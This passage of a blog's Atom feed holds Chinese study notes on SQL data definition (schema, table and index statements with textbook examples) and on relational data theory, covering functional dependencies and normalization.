    <category term="计算机组成原理" scheme="http://example.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/"/>
    
    
    <category term="计算机组成原理" scheme="http://example.com/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/"/>
    
    <category term="408" scheme="http://example.com/tags/408/"/>
    
  </entry>
  
  <entry>
    <title>数据库-关系数据库标准语言SQL</title>
    <link href="http://example.com/post/%E6%95%B0%E6%8D%AE%E5%BA%93-%E5%85%B3%E7%B3%BB%E6%95%B0%E6%8D%AE%E5%BA%93%E6%A0%87%E5%87%86%E8%AF%AD%E8%A8%80SQL.html"/>
    <id>http://example.com/post/%E6%95%B0%E6%8D%AE%E5%BA%93-%E5%85%B3%E7%B3%BB%E6%95%B0%E6%8D%AE%E5%BA%93%E6%A0%87%E5%87%86%E8%AF%AD%E8%A8%80SQL.html</id>
    <published>2022-06-09T11:13:01.000Z</published>
    <updated>2022-06-11T04:04:11.209Z</updated>
    
    <content type="html"><![CDATA[<h2 id="33-数据定义"><a class="markdownIt-Anchor" href="#33-数据定义">#</a> 3.3 数据定义</h2><h3 id="331-模式的定义与删除"><a class="markdownIt-Anchor" href="#331-模式的定义与删除">#</a> 3.3.1 模式的定义与删除</h3><h4 id="1定义模式"><a class="markdownIt-Anchor" href="#1定义模式">#</a> 1. 定义模式</h4><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">create</span> <span class="token keyword">schema</span> <span class="token operator">&lt;</span>模式名<span class="token operator">></span> <span class="token keyword">authorization</span> <span class="token operator">&lt;</span>用户名<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>例 3.1：为用户 WANG 定义一个学生 - 课程模式 S-T</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">create</span> <span class="token keyword">schema</span> <span class="token string">"S-T"</span> <span class="token keyword">authorization</span> WANG<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="2删除模式"><a class="markdownIt-Anchor" href="#2删除模式">#</a> 2. 删除模式</h4><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">drop</span> <span class="token keyword">schema</span> <span class="token operator">&lt;</span>模式名<span class="token operator">></span> <span class="token operator">&lt;</span><span class="token keyword">cascade</span><span class="token operator">|</span><span class="token keyword">restrict</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="332-基本表的定义-删除与修改"><a class="markdownIt-Anchor" href="#332-基本表的定义-删除与修改">#</a> 3.3.2 基本表的定义、删除与修改</h3><h4 id="1定义基本表"><a class="markdownIt-Anchor" href="#1定义基本表">#</a> 1. 定义基本表</h4><p>例 3.5：建立一个学生表 Student</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">create</span> <span class="token keyword">table</span> student<span class="token punctuation">(</span>    sco <span class="token keyword">char</span><span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span> <span class="token keyword">primary</span> <span class="token keyword">key</span><span class="token punctuation">,</span>    sname <span class="token keyword">char</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span> <span class="token keyword">unique</span><span class="token punctuation">,</span>    ssex <span class="token keyword">char</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    sage <span class="token keyword">smallint</span><span class="token punctuation">,</span>    sdept <span class="token keyword">char</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="2数据类型"><a class="markdownIt-Anchor" href="#2数据类型">#</a> 2. 数据类型</h4><h4 id="3模式与表"><a class="markdownIt-Anchor" href="#3模式与表">#</a> 3. 模式与表</h4><h4 id="4修改基本表"><a class="markdownIt-Anchor" href="#4修改基本表">#</a> 4. 修改基本表</h4><p>例 3.8：向 Student 表增加” 入学时间 “列，其数据类型为日期型</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">alter</span> <span class="token keyword">table</span> Student <span class="token keyword">add</span> S_entrance <span class="token keyword">DATE</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>例 3.9：将年龄的数据类型由字符型（假设原来的数据类型是字符型）改为整数</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">alter</span> <span class="token keyword">table</span> Student <span class="token keyword">alter</span> <span class="token keyword">column</span> Sage <span class="token keyword">INT</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>例 3.10：增加课程名称必须取唯一值的约束条件</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">alter</span> <span class="token keyword">table</span> Student <span class="token keyword">add</span> <span class="token keyword">unique</span><span class="token punctuation">(</span>Cname<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="5删除基本表"><a class="markdownIt-Anchor" href="#5删除基本表">#</a> 5. 删除基本表</h4><p>例 3.11：删除 Student 表</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">drop</span> <span class="token keyword">table</span> Student <span class="token keyword">cascade</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="333-索引的建立与删除"><a class="markdownIt-Anchor" href="#333-索引的建立与删除">#</a> 3.3.3 索引的建立与删除</h3><h4 id="1建立索引"><a class="markdownIt-Anchor" href="#1建立索引">#</a> 1. 建立索引</h4><p>在 SQL 语言中，建立索引使用 CREATE INDEX 语句，其一般格式为：</p><p><code>CREATE [UNIQUE][CLUSTER] INDEX 索引名 ON &lt;表名&gt;(&lt;列名&gt;[&lt;次序&gt;])</code></p><p>例 3.13：为学生 - 课程数据库中的 Student、Course 和 SC 三个表建立索引。其中 Student 表按学号升序建唯一索引，Course 表按课程号升序建唯一索引，SC 表按学号升序和课程号降序建唯一索引。</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">create</span> <span class="token keyword">unique</span> <span class="token keyword">index</span> stusno <span class="token keyword">on</span> student<span class="token punctuation">(</span>Sno<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">CREATE</span> <span class="token keyword">UNIQUE</span> <span class="token keyword">INDEX</span> Coucno <span class="token keyword">ON</span> Course<span class="token punctuation">(</span>Cno<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">CREATE</span> <span class="token keyword">UNIQUE</span> <span class="token keyword">INDEX</span> SCno <span class="token keyword">ON</span> SC<span class="token punctuation">(</span>Sno <span class="token keyword">ASC</span><span class="token punctuation">,</span> Cno <span class="token keyword">DESC</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="2修改索引"><a class="markdownIt-Anchor" href="#2修改索引">#</a> 2. 修改索引</h4><p>例 3.14：将 SC 表的 SCno 索引名改为 SCSno</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">ALTER</span> <span class="token keyword">INDEX</span> SCno <span class="token keyword">RENAME</span> <span class="token keyword">TO</span> SCSno<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="3删除索引"><a class="markdownIt-Anchor" href="#3删除索引">#</a> 3. 删除索引</h4><pre class="line-numbers language-SQL" data-language="SQL"><code class="language-SQL">DROP INDEX Stusname;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="34-数据查询"><a class="markdownIt-Anchor" href="#34-数据查询">#</a> 3.4 数据查询</h3>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;33-数据定义&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#33-数据定义&quot;&gt;#&lt;/a&gt; 3.3 数据定义&lt;/h2&gt;
&lt;h3 id=&quot;331-模式的定义与删除&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#</summary>
      
    
    
    
    <category term="数据库" scheme="http://example.com/categories/%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
    
    
    <category term="数据库" scheme="http://example.com/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
    
  </entry>
  
  <entry>
    <title>数据库-关系数据理论</title>
    <link href="http://example.com/post/%E6%95%B0%E6%8D%AE%E5%BA%93-%E5%85%B3%E7%B3%BB%E6%95%B0%E6%8D%AE%E7%90%86%E8%AE%BA.html"/>
    <id>http://example.com/post/%E6%95%B0%E6%8D%AE%E5%BA%93-%E5%85%B3%E7%B3%BB%E6%95%B0%E6%8D%AE%E7%90%86%E8%AE%BA.html</id>
    <published>2022-06-08T13:12:23.000Z</published>
    <updated>2022-06-11T04:04:45.504Z</updated>
    
    <content type="html"><![CDATA[<h2 id="61-问题的提出"><a class="markdownIt-Anchor" href="#61-问题的提出">#</a> 6.1 问题的提出</h2><p>R(U,D,DOM,F)：</p><ul><li>关系明 R 是符号化的元组语义</li><li>U 为一组属性</li><li>D 为属性组 U 中的属性所来自的域</li><li>DOM 为属性到域的映射</li><li>F 为属性组 U 上的一组数据依赖</li></ul><p><strong>第一范式</strong>：每一个分量必须是不可分割的数据项</p><p>数据依赖是一个关系内部属性与属性之间的一种约束关系，是通过属性间值的相等与否体现出来的数据间相关联系。其中最重要的是<strong>函数依赖</strong>和<strong>多值依赖</strong>。</p><p>函数依赖：比如描述一个学生的关系，可以有学号 (sno)，姓名 (sname)，系名 (sdept) 等几个属性。由于一个学号只对应一个学生，一个学生只在一个系学习。因而当” 学号 “的值确定之后，学生的姓名及所在的系值也就被唯一地确定了。类似的有<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi><mi>n</mi><mi>a</mi><mi>m</mi><mi>e</mi><mo>=</mo><mi>f</mi><mo stretchy="false">(</mo><mi>s</mi><mi>n</mi><mi>o</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">Sname = f(sno)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mord mathnormal">n</span><span class="mord mathnormal">a</span><span class="mord mathnormal">m</span><span class="mord mathnormal">e</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathnormal">s</span><span class="mord mathnormal">n</span><span class="mord mathnormal">o</span><span class="mclose">)</span></span></span></span>，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi><mi>d</mi><mi>e</mi><mi>p</mi><mi>t</mi><mo>=</mo><mi>f</mi><mo stretchy="false">(</mo><mi>S</mi><mi>n</mi><mi>o</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">Sdept = f(Sno)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mord mathnormal">d</span><span class="mord mathnormal">e</span><span class="mord mathnormal">p</span><span class="mord mathnormal">t</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mord mathnormal">n</span><span class="mord mathnormal">o</span><span class="mclose">)</span></span></span></span>，即 sno 函数决定 sname，或者说 sname 函数依赖于 sno。记作<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi><mi>n</mi><mi>o</mi><mo>→</mo><mi>S</mi><mi>n</mi><mi>a</mi><mi>m</mi><mi>e</mi></mrow><annotation encoding="application/x-tex">Sno \rightarrow Sname</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mord mathnormal">n</span><span class="mord mathnormal">o</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mord mathnormal">n</span><span class="mord mathnormal">a</span><span class="mord mathnormal">m</span><span class="mord mathnormal">e</span></span></span></span>。</p><p Sno="" \rightarrow="" Sdept,Sdept="" \rightarrow="" Mname,(Sno,Cno)="" \rightarrow="" Grade\="">一个学生例子：F=\</p><p>但是这个关系存在以下的问题：</p><ol><li>数据冗余<ul><li>如一个系的系主任名重复出现</li></ul></li><li>更新异常</li><li>插入异常</li><li>删除异常</li></ol><p>将这个单一的模式改造如下，分成三个关系模式：</p><ul><li><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi><mo stretchy="false">(</mo><mi>S</mi><mi>n</mi><mi>o</mi><mo separator="true">,</mo><mi>S</mi><mi>d</mi><mi>e</mi><mi>p</mi><mi>t</mi><mo separator="true">,</mo><mi>S</mi><mi>n</mi><mi>o</mi><mo>→</mo><mi>S</mi><mi>d</mi><mi>e</mi><mi>p</mi><mi>t</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">S(Sno,Sdept,Sno \rightarrow Sdept )</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mord mathnormal">n</span><span class="mord mathnormal">o</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mord mathnormal">d</span><span class="mord mathnormal">e</span><span class="mord mathnormal">p</span><span class="mord mathnormal">t</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mord mathnormal">n</span><span class="mord mathnormal">o</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mord mathnormal">d</span><span class="mord mathnormal">e</span><span class="mord mathnormal">p</span><span class="mord mathnormal">t</span><span class="mclose">)</span></span></span></span></li><li><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi><mi>C</mi><mo stretchy="false">(</mo><mi>S</mi><mi>n</mi><mi>o</mi><mo separator="true">,</mo><mi>C</mi><mi>n</mi><mi>o</mi><mo separator="true">,</mo><mi>G</mi><mi>r</mi><mi>a</mi><mi>d</mi><mi>e</mi><mo separator="true">,</mo><mo stretchy="false">(</mo><mi>S</mi><mi>n</mi><mi>o</mi><mo separator="true">,</mo><mi>C</mi><mi>n</mi><mi>o</mi><mo stretchy="false">)</mo><mo>→</mo><mi>G</mi><mi>r</mi><mi>a</mi><mi>d</mi><mi>e</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">SC(Sno,Cno,Grade,(Sno,Cno) \rightarrow Grade)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mord mathnormal">n</span><span class="mord mathnormal">o</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal">n</span><span class="mord mathnormal">o</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">G</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">a</span><span class="mord mathnormal">d</span><span class="mord mathnormal">e</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mord mathnormal">n</span><span class="mord mathnormal">o</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal">n</span><span class="mord mathnormal">o</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">G</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">a</span><span class="mord mathnormal">d</span><span class="mord mathnormal">e</span><span class="mclose">)</span></span></span></span></li><li><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>D</mi><mi>E</mi><mi>P</mi><mi>T</mi><mo stretchy="false">(</mo><mi>S</mi><mi>d</mi><mi>e</mi><mi>p</mi><mi>t</mi><mo separator="true">,</mo><mi>M</mi><mi>n</mi><mi>a</mi><mi>m</mi><mi>e</mi><mo separator="true">,</mo><mi>S</mi><mi>d</mi><mi>e</mi><mi>p</mi><mi>t</mi><mo>→</mo><mi>M</mi><mi>n</mi><mi>a</mi><mi>m</mi><mi>e</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">DEPT(Sdept,Mname,Sdept \rightarrow Mname)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mord mathnormal">d</span><span class="mord mathnormal">e</span><span class="mord mathnormal">p</span><span class="mord mathnormal">t</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mord mathnormal">n</span><span class="mord mathnormal">a</span><span class="mord mathnormal">m</span><span class="mord mathnormal">e</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mord mathnormal">d</span><span class="mord mathnormal">e</span><span class="mord mathnormal">p</span><span class="mord mathnormal">t</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mord mathnormal">n</span><span class="mord mathnormal">a</span><span class="mord mathnormal">m</span><span class="mord mathnormal">e</span><span class="mclose">)</span></span></span></span></li></ul><h2 id="62-规范化"><a class="markdownIt-Anchor" href="#62-规范化">#</a> 6.2 规范化</h2><p>通常按属性间依赖情况来区分关系规范化程度为第一范式、第二范式、第三范式和第四范式，然后，直观地描述如何将具有不合适性质的关系转换为更合适的形式。</p><h3 id="621-函数依赖"><a class="markdownIt-Anchor" href="#621-函数依赖">#</a> 6.2.1 函数依赖</h3><p>定义<strong> 6.1</strong>：设 R (U) 是属性集 U 上的关系模式，X, Y 是 U 的子集。若对于 R (U) 的任意一个可能的关系 r，r 中不可能存在两个元组在 X 上的属性值相等，而在 Y 上的属性值不等，则称 X 函数确定 Y 或 Y 函数依赖于 X，记作<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>X</mi><mo>→</mo><mi>Y</mi></mrow><annotation encoding="application/x-tex">X \rightarrow Y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span></span></span></span>。</p><p>函数依赖和别的数据依赖一样是语义范畴的概念，只能根据语义来确定一个函数依赖。例如，姓名<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>→</mo></mrow><annotation encoding="application/x-tex">\rightarrow</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">→</span></span></span></span> 年龄这个函数依赖只有在该部门没有同名人的条件下成立。</p><p>下面介绍一些术语和记号：</p><ul><li><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>X</mi><mo>→</mo><mi>Y</mi></mrow><annotation encoding="application/x-tex">X \rightarrow Y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span></span></span></span>，但 Y 不属于 X，则称<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>X</mi><mo>→</mo><mi>Y</mi></mrow><annotation encoding="application/x-tex">X \rightarrow Y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span></span></span></span> 是<strong>非平凡的函数依赖</strong>。</li><li><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>X</mi><mo>→</mo><mi>Y</mi></mrow><annotation encoding="application/x-tex">X \rightarrow Y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span></span></span></span>，但 Y 属于 X，则称<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>X</mi><mo>→</mo><mi>Y</mi></mrow><annotation encoding="application/x-tex">X \rightarrow Y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span></span></span></span> 是<strong>平凡的函数依赖</strong>。对于任一关系模式，平凡函数依赖都是必然成立的，他不反映新的语义。若不特别声明，总是讨论非平凡的函数依赖。</li><li>若<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>X</mi><mo>→</mo><mi>Y</mi></mrow><annotation encoding="application/x-tex">X \rightarrow Y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span></span></span></span>，则称 X 为这个函数依赖的决定属性组，也称为<strong>决定因素</strong>。</li><li>若<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>X</mi><mo>→</mo><mi>Y</mi></mrow><annotation encoding="application/x-tex">X \rightarrow Y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span></span></span></span>，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Y</mi><mo>→</mo><mi>X</mi></mrow><annotation encoding="application/x-tex">Y \rightarrow X</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span></span></span></span>，则记作<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>X</mi><mo>←</mo><mo>→</mo><mi>Y</mi></mrow><annotation encoding="application/x-tex">X \leftarrow \rightarrow Y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">←</span></span><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span></span></span></span>。</li><li>若 Y 不函数依赖于 X，则记作<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>X</mi><mo>→</mo><mi>Y</mi></mrow><annotation encoding="application/x-tex">X \rightarrow Y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span></span></span></span>，箭头加斜线</li></ul><p>定义<strong> 6.2</strong>：在 R (U) 中，如果<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>X</mi><mo>→</mo><mi>Y</mi></mrow><annotation encoding="application/x-tex">X \rightarrow Y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span></span></span></span>，并且对于 X 的任何一个真子集<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>X</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup></mrow><annotation encoding="application/x-tex">X&#x27;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" 